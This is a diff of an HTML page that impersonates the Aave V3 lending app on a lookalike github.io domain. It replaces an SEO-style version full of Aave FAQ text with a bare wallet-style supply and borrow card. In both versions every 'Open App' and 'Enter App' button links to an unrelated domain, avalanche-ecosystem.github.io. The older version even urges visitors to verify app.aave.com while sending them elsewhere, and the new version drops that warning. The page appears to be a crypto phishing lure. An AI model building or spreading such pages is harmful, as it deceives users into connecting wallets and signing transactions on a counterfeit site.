@@ -1,47 +1,115 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Aave - Open App</title><meta name="description" content="Aave app access for token swaps, collateral swaps, supply, borrow, and position management. Verify app.aave.com before connecting.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://aave-v3-app.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="Aave - Open App"><meta property="og:description" content="Aave app access for token swaps, collateral swaps, supply, borrow, and position management. Verify app.aave.com before connecting.">
-<meta property="og:url" content="https://aave-v3-app.github.io/"><meta property="og:image" content="https://aave-v3-app.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Aave - Open App"><meta name="twitter:description" content="Aave app access for token swaps, collateral swaps, supply, borrow, and position management. Verify app.aave.com before connecting."><meta name="twitter:image" content="https://aave-v3-app.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://aave-v3-app.github.io/#website", "url": "https://aave-v3-app.github.io/", "name": "Aave"}, {"@type": "WebPage", "@id": "https://aave-v3-app.github.io/#webpage", "url": "https://aave-v3-app.github.io/", "name": "Aave - Open App", "description": "Aave app access for token swaps, collateral swaps, supply, borrow, and position management. Verify app.aave.com before connecting.", "inLanguage": "en", "isPartOf": {"@id": "https://aave-v3-app.github.io/#website"}}, {"@type": "Organization", "@id": "https://aave-v3-app.github.io/#org", "name": "Aave", "url": "https://aave-v3-app.github.io/", "logo": "https://aave-v3-app.github.io/og-cover.png", "sameAs": ["https://x.com/aave", "https://github.com/aave", "https://www.coingecko.com/en/coins/aave", "https://defillama.com/protocol/aave-v3"]}, {"@type": "WebApplication", "@id": "https://aave-v3-app.github.io/#app", "name": "Aave", "url": "https://aave-v3-app.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "Aave app access for token swaps, collateral swaps, supply, borrow, and position management. Verify app.aave.com before connecting.", "featureList": ["Non-custodial liquidity protocol", "Swap features documented", "Open-source smart contracts"], "isPartOf": {"@id": "https://aave-v3-app.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://aave-v3-app.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "What happens when you supply assets to Aave V3?", "acceptedAnswer": {"@type": "Answer", "text": "When you supply an asset to Aave V3, the protocol mints an interest-bearing aToken for that asset, such as aUSDC or aWETH. The aToken represents your supplied position and accrues value as borrowers pay interest into the reserve. You can usually withdraw the underlying asset when there is enough unborrowed liquidity and your withdrawal does not make any active borrow position unsafe."}}, {"@type": "Question", "name": "Can you lose collateral on Aave?", "acceptedAnswer": {"@type": "Answer", "text": "Yes. A borrower can lose collateral through liquidation if the position's health factor falls below 1. Liquidation happens when collateral is no longer sufficient for the debt under Aave's reserve parameters and oracle prices. The liquidator repays part of the debt and receives collateral with a bonus. This is why borrowers keep a buffer and monitor health factor, not just loan size."}}, {"@type": "Question", "name": "What is E-Mode in Aave V3?", "acceptedAnswer": {"@type": "Answer", "text": "E-Mode, or Efficiency Mode, is an Aave V3 feature for correlated assets. When a user supplies and borrows assets inside the same E-Mode category, the protocol can allow higher capital efficiency than normal parameters. A common example is stablecoin-to-stablecoin borrowing. The feature can improve borrowing power, but it also concentrates risk around assets that are assumed to remain correlated."}}, {"@type": "Question", "name": "What is Isolation Mode in Aave V3?", "acceptedAnswer": {"@type": "Answer", "text": "Isolation Mode lets Aave list newer or riskier collateral assets while limiting system-wide exposure. If a user supplies an isolated collateral asset, borrowing is restricted to specific assets, usually stablecoins, and a debt ceiling applies. The goal is to allow more collateral listings without letting one volatile or less-proven asset create unlimited risk across the whole market."}}, {"@type": "Question", "name": "Does Aave V3 have fixed APY?", "acceptedAnswer": {"@type": "Answer", "text": "No. Aave V3 APY changes by asset, chain, utilization, reserve parameters, and incentives. Supplier yield comes from borrower interest net of protocol reserve factors, while borrow rates follow the market's interest rate strategy. A rate visible today can be different later. Users should compare the live supply APY, borrow APR, incentives, liquidity, and health-factor impact before entering a position."}}, {"@type": "Question", "name": "What is the AAVE token for?", "acceptedAnswer": {"@type": "Answer", "text": "AAVE is the governance token for the Aave ecosystem. It is distinct from aTokens, which represent supplied assets, and from GHO, the Aave ecosystem stablecoin. AAVE holders can participate in governance processes that influence protocol upgrades, markets, parameters, and ecosystem decisions. Buying AAVE does not automatically supply funds to Aave V3 or earn lending interest."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="Aave"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">Aave</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>Aave</h1>
-      <div class="bridge-widget" role="group" aria-label="Aave preview"><div class="bw-field"><span class="bw-coin"><img src="static/eth.png" alt="ETH" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>ETH</b> · Ethereum</span></span></div><div class="bw-apy"><b>APY</b><span>est*</span></div><div class="bw-field"><span class="bw-coin"><img src="static/usdc.png" alt="USDC" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>USDC</b> · Ethereum</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Aave ↗</a></div>
-      <p class="hero-note">Live preview — APY is indicative; check the live rate in the official Aave app.</p>
-      <div class="trust-row"><span class="trust-chip">Non-custodial liquidity protocol</span><span class="trust-chip">Swap features documented</span><span class="trust-chip">Open-source smart contracts</span></div>
-    </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is Aave?</h2><div class="capsule"><strong>Aave</strong> is a <a class="inline-link" href="https://docs.aave.com/faq/" rel="noopener noreferrer">decentralised non-custodial liquidity protocol</a> where <a class="inline-link" href="https://docs.aave.com/guides/getting-started" rel="noopener noreferrer">suppliers provide liquidity and borrowers access liquidity by providing collateral</a>, as described in the <a href='https://aave.com/docs'>Aave documentation</a>. The official interface also exposes swap tools for tokens and position management where supported.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>Aave at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>Decentralized lending</b></div><div class="f"><small>Network</small><b>Multi-chain</b></div><div class="f"><small>Token</small><b>AAVE</b></div><div class="f"><small>Stablecoin</small><b><a class="inline-link" href="https://www.coingecko.com/en/coins/gho" rel="noopener noreferrer">GHO</a></b></div><div class="f"><small>Version</small><b>Aave V3</b></div><div class="f"><small>Custody</small><b>Non-custodial overcollateralized liquidity pools</b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Aave V3 supply APY and borrow rates</h2><div class="intent-a">Aave V3 supply APY and borrow rates are market-based, not fixed. Suppliers earn interest from borrowers, and borrow rates rise or fall with utilization of each reserve. If a pool has high utilization, borrowing becomes more expensive and supplier yield can rise; if liquidity is abundant, both rates can fall. Aave docs describe a utilization-based interest rate model with an <a class="inline-link" href="https://academy.binance.com/en/articles/what-is-aave-and-how-does-it-work" rel="noopener noreferrer">optimal utilization point</a> and steeper rates above that point. For searchers, the only accurate APY is the live rate for a specific asset, market, and chain in the Aave app. Stablecoin supply may be a few percent in normal conditions, but it can move quickly.</div></div></section><section class="section"><div class="container"><h2>Aave V3 health factor and liquidation</h2><div class="intent-a">Aave V3 health factor measures whether a borrowing position has enough collateral relative to its debt. If the health factor falls below 1, the position becomes eligible for liquidation. That can happen when collateral prices fall, borrowed assets rise, interest accrues, or collateral parameters change. A liquidator can repay part of the debt and receive collateral with a <a class="inline-link" href="https://github.com/aave/risk-v3/blob/main/asset-risk/risk-parameters.md" rel="noopener noreferrer">liquidation bonus</a> defined for the reserve. Borrowers should track health factor, <a class="inline-link" href="https://www.investopedia.com/aave-arc-7110067" rel="noopener noreferrer">liquidation threshold</a>, loan-to-value, and oracle prices rather than only watching the dollar value of collateral. The practical goal is to keep a margin above 1 that fits the volatility of the assets used.</div></div></section><section class="section section-alt"><div class="container"><h2>Aave V3 collateral assets and E-Mode</h2><div class="intent-a">Aave V3 supports collateral and borrowing by market, reserve, and chain. Not every listed asset can be used the same way: each reserve has parameters such as loan-to-value, liquidation threshold, supply cap, borrow cap, isolation settings, and <a class="inline-link" href="https://github.com/aave/risk-v3/blob/main/asset-risk/risk-parameters.md" rel="noopener noreferrer">reserve factor</a>. E-Mode is designed for correlated assets, such as certain stablecoins or ETH-correlated assets, and can improve capital efficiency when the supplied and borrowed assets are in the same category. Isolation Mode limits riskier collateral by restricting what can be borrowed and applying debt ceilings. Users should check live reserve parameters before using any asset as collateral.</div></div></section><section class="section"><div class="container"><h2>Aave V3 flash loans</h2><div class="intent-a">Aave V3 flash loans let developers borrow liquidity and repay it within the same transaction. If the transaction does not repay according to the protocol rules, the whole transaction reverts. This design is mainly for developers building arbitrage, collateral swaps, liquidations, migrations, or other <a class="inline-link" href="https://www.messari.io/report/state-of-aave-v3" rel="noopener noreferrer">atomic DeFi operations</a>. It is not a normal consumer loan and does not remove the need for smart contract execution knowledge. Aave's documentation includes flash loan guides and contract interfaces, but users should treat flash loans as an advanced feature because errors can waste gas or expose contracts to execution risk.</div></div></section><section class="section section-alt"><div class="container"><h2>Aave GHO and sGHO</h2><div class="intent-a">GHO is the Aave ecosystem stablecoin, while sGHO refers to Savings GHO, a yield-oriented form described in Aave's documentation. GHO is separate from AAVE, the governance token, and separate from aTokens, which represent supplied assets in Aave markets. Aave users may encounter GHO as a borrowable or usable asset depending on the market and governance configuration. Searchers should check the live app for GHO liquidity, borrow terms, and savings rate because stablecoin usage is parameter-driven and can change through governance and market conditions.</div></div></section>
-  <section class="section"><div class="container"><h2>How to swap Aave</h2><ol class="steps"><li><b>Open the app</b><span>Use app.aave.com and confirm the domain before connecting a wallet.</span></li><li><b>Choose a market</b><span>Select the network and market shown by the interface; available assets and swap flows vary by market.</span></li><li><b>Pick a swap action</b><span>Use token swap, collateral swap, repay with collateral, debt swap, or withdraw and swap when available.</span></li><li><b>Review and sign</b><span>Check route provider, minimum received, approvals, health factor effects, and network costs before signing.</span></li></ol><div class="cta-band"><div><p>Ready to swap?</p><p class="sub">Open the official Aave app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Aave ↗</a></div></div></section>
-  <section class="section"><div class="container"><h2>Aave V3 vs Compound</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>Aave V3</th><th>Alternative</th></tr></thead><tbody><tr><td>Core use</td><td>Supply, borrow, repay, withdraw</td><td>Supply and borrow markets</td></tr><tr><td>Receipt/debt tokens</td><td>aTokens and variable debt tokens</td><td>Protocol-specific receipt/debt accounting</td></tr><tr><td>Risk features</td><td>E-Mode, Isolation Mode, caps, health factor</td><td>Market-specific collateral factors and limits</td></tr><tr><td>Advanced feature</td><td>Flash loans and credit delegation</td><td>Protocol-specific advanced features</td></tr><tr><td>Stablecoin ecosystem</td><td>GHO and sGHO</td><td>Protocol-specific or external stablecoins</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>Aave FAQ</h2><div class="faq-list"><details open><summary><h3>What happens when you supply assets to Aave V3?</h3></summary><div>When you supply an asset to Aave V3, the protocol mints an interest-bearing aToken for that asset, such as aUSDC or aWETH. The aToken represents your supplied position and accrues value as borrowers pay interest into the reserve. You can usually withdraw the underlying asset when there is enough unborrowed liquidity and your withdrawal does not make any active borrow position unsafe.</div></details><details><summary><h3>Can you lose collateral on Aave?</h3></summary><div>Yes. A borrower can lose collateral through liquidation if the position's health factor falls below 1. Liquidation happens when collateral is no longer sufficient for the debt under Aave's reserve parameters and oracle prices. The liquidator repays part of the debt and receives collateral with a bonus. This is why borrowers keep a buffer and monitor health factor, not just loan size.</div></details><details><summary><h3>What is E-Mode in Aave V3?</h3></summary><div>E-Mode, or Efficiency Mode, is an Aave V3 feature for correlated assets. When a user supplies and borrows assets inside the same E-Mode category, the protocol can allow higher capital efficiency than normal parameters. A common example is stablecoin-to-stablecoin borrowing. The feature can improve borrowing power, but it also concentrates risk around assets that are assumed to remain correlated.</div></details><details><summary><h3>What is Isolation Mode in Aave V3?</h3></summary><div>Isolation Mode lets Aave list newer or riskier collateral assets while limiting system-wide exposure. If a user supplies an isolated collateral asset, borrowing is restricted to specific assets, usually stablecoins, and a debt ceiling applies. The goal is to allow more collateral listings without letting one volatile or less-proven asset create unlimited risk across the whole market.</div></details><details><summary><h3>Does Aave V3 have fixed APY?</h3></summary><div>No. Aave V3 APY changes by asset, chain, utilization, reserve parameters, and incentives. Supplier yield comes from borrower interest net of protocol reserve factors, while borrow rates follow the market's interest rate strategy. A rate visible today can be different later. Users should compare the live supply APY, borrow APR, incentives, liquidity, and health-factor impact before entering a position.</div></details><details><summary><h3>What is the AAVE token for?</h3></summary><div>AAVE is the governance token for the Aave ecosystem. It is distinct from aTokens, which represent supplied assets, and from GHO, the Aave ecosystem stablecoin. AAVE holders can participate in governance processes that influence protocol upgrades, markets, parameters, and ecosystem decisions. Buying AAVE does not automatically supply funds to Aave V3 or earn lending interest.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <div class="footer-grid"></div>
-  <p class="footer-note">This page is not the official Aave app; verify app.aave.com before connecting a wallet; educational only, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Aave V3</title>
+  <meta name="description" content="Aave V3 lets you supply and borrow crypto from your own wallet on the Aave V3 protocol.">
+  <link rel="canonical" href="https://aave-v3-app.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F7F5F7">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Aave V3">
+  <meta property="og:description" content="Aave V3 lets you supply and borrow crypto from your own wallet on the Aave V3 protocol.">
+  <meta property="og:url" content="https://aave-v3-app.github.io/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Aave V3">
+  <meta name="twitter:description" content="Aave V3 lets you supply and borrow crypto from your own wallet on the Aave V3 protocol.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://aave-v3-app.github.io/#website",
+        "url": "https://aave-v3-app.github.io/",
+        "name": "Aave V3"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://aave-v3-app.github.io/#app",
+        "name": "Aave V3",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://aave-v3-app.github.io/"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://aave-v3-app.github.io/#organization",
+        "name": "Aave",
+        "url": "https://aave.com/"
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Aave V3 home">
+      <img src="favicon.png" width="30" height="30" alt="">
+      <span>Aave V3</span>
+    </a>
+    <nav class="nav" aria-label="Authority references">
+      <a href="https://etherscan.io/address/0x87870bca3f3fd6335c3f4ce8392d69350b4fa4e2" target="_blank" rel="nofollow noopener noreferrer">Pool contract</a>
+      <a href="https://aave.com/docs" target="_blank" rel="nofollow noopener noreferrer">Docs</a>
+      <a href="https://defillama.com/protocol/aave-v3" target="_blank" rel="nofollow noopener noreferrer">Market data</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-label="Aave V3">
+      <h1>Aave V3</h1>
+      <p class="sub"><strong>Aave V3</strong> lets you supply and borrow crypto from your own wallet on the Aave V3 protocol.</p>
+    </section>
+
+    <section class="app-card" aria-label="Lending card">
+      <div class="legs">
+        <div class="leg">
+          <span class="label">Supply</span>
+          <span class="chip">
+            <img class="token" src="usdc.png" width="30" height="30" alt="USDC">
+            <span>USDC</span>
+          </span>
+        </div>
+        <button class="switch" type="button" data-switch aria-label="Swap supply and borrow assets">
+          <span aria-hidden="true">&#8644;</span>
+        </button>
+        <div class="leg">
+          <span class="label">Borrow</span>
+          <span class="chip">
+            <img class="token" src="eth.png" width="30" height="30" alt="ETH">
+            <span>ETH</span>
+          </span>
+        </div>
+      </div>
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
+    </section>
+  </main>
+
+  <footer class="foot">Aave V3 — 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+
+    button.addEventListener("click", function () {
+      var chips = document.querySelectorAll(".leg .chip");
+      if (chips.length !== 2) return;
+
+      var first = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = first;
+      button.classList.toggle("is-swapped");
+    });
+  })();
+  </script>
+</body>
+</html>
